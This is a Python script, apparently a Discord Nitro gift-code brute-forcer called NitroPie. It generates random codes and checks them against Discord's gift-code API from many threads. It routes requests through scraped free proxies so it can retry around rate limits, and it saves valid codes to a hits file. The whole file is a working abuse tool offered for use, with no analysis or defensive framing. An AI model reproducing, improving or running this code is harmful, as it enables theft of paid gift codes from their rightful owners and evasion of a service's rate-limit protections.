import requests, string, random, time, json, threading, os

def generate_code() -> str:
    ASCII_VOCABULARY = string.ascii_letters + string.digits
    CODE = ''.join(random.choices(ASCII_VOCABULARY, k=24))
    return CODE

def get_proxies() -> list:
    resp = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000")
    proxies = resp.text.split('\r\n')
    
    return proxies

def check_code(code : str, proxies : list) -> str:
    while True:
        try:
            proxy = {"https": 'http://' + random.choice(proxies)}
            headers={"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
            session = requests.session()
            session.proxies.update(proxy)
            resp = session.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true")
            
            if resp.status_code == 200:
                print(resp.text)
                DATA = json.loads(resp.text)
                CODE = DATA['code']
                PLAN = DATA['subscription_plan']['name']
                PLAN_CURRENCY = DATA['subscription_plan']['currency']
                PLAN_PRICE = DATA['subscription_plan']['price']
                print(f'HIT: \n{"-" * 35} \n| CODE: {CODE} \n| PLAN: {PLAN} \n| PRICE: {PLAN_CURRENCY.upper()} {PLAN_PRICE} \n{"-" * 35}')
                with open ('hits.txt', 'a+') as f:
                    f.write(f'{"-" * 35} \n| CODE: {CODE} \n| PLAN: {PLAN} \n| PRICE: {PLAN_CURRENCY.upper()} {PLAN_PRICE} \n{"-" * 35}\n\n')
                break

            elif resp.status_code == 404:
                print(f'Error (Status Code: 404): Invalid Code.     -> {code}')
                break

            elif resp.status_code == 429:
                print(f"Error (Status Code: 429): You Are Being Rate Limited.   -> {proxy}")
                continue

        except Exception as e:
            print('Proxy Error: ' + str(proxy))
            time.sleep(2)

def nitro(proxies : list):
    while True:
        CODE = generate_code()
        check_code(CODE, proxies)

def main():
    os.system('Title NitroPie ~ Made By a2N5YmU=#6111')
    print('''              ___                                   ___           ___           ___                     ___     
             /__/\        ___           ___        /  /\         /  /\         /  /\      ___          /  /\    
             \  \:\      /  /\         /  /\      /  /::\       /  /::\       /  /::\    /  /\        /  /:/_   
              \  \:\    /  /:/        /  /:/     /  /:/\:\     /  /:/\:\     /  /:/\:\  /  /:/       /  /:/ /\  
          _____\__\:\  /__/::\       /  /:/     /  /:/~/:/    /  /:/  \:\   /  /:/~/:/ /__/::\      /  /:/ /:/_ 
         /__/::::::::\ \__\/\:\__   /  /::\    /__/:/ /:/___ /__/:/ \__\:\ /__/:/ /:/  \__\/\:\__  /__/:/ /:/ /\\
         \  \:\~~\~~\/    \  \:\/\ /__/:/\:\   \  \:\/:::::/ \  \:\ /  /:/ \  \:\/:/      \  \:\/\ \  \:\/:/ /:/
          \  \:\  ~~~      \__\::/ \__\/  \:\   \  \::/~~~~   \  \:\  /:/   \  \::/        \__\::/  \  \::/ /:/ 
           \  \:\          /__/:/       \  \:\   \  \:\        \  \:\/:/     \  \:\        /__/:/    \  \:\/:/  
            \  \:\         \__\/         \__\/    \  \:\        \  \::/       \  \:\       \__\/      \  \::/   
             \__\/                                 \__\/         \__\/         \__\/                   \__\/    

    ''')
    threads_amount = int(input('Threads: '))

    proxies = get_proxies()
    try:
        threads = []

        for _ in range(threads_amount):
            t = threading.Thread(target = nitro, args = [proxies])
            t.start()
            threads.append(t)

        for thread in threads:
            thread.join()

    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()
    